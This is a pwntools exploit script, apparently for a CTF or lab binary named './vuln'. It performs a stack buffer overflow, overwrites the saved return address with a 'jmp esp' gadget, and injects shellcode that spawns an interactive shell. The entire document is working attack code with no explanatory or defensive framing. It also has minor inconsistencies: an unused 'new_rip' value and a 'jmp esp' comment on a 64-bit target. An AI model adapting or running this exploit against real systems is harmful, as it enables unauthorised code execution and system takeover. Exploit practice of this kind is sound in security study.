#!/usr/bin/env python3
from pwn import *

# we overflow saved rip after 280 or 0x118 bytes
overflow_offset_rip = 280

# we point saved rip to the address of the start of our buffer
new_rip = 0x7FFFFFFFE000

context.terminal = ["wezterm", "start", "--"]

# construct shellcode
# let pwntools know we're dealing with a 64-bit target
context.update(arch="amd64")

# assemble shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# construct payload
payload = b"A" * overflow_offset_rip
payload += p64(0x0000000000401154)  # jmp esp
payload += shellcode  # shellcode

# connect to the vulnerable program
p = process("./vuln")
# gdb.attach(p, api=True)

# send payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
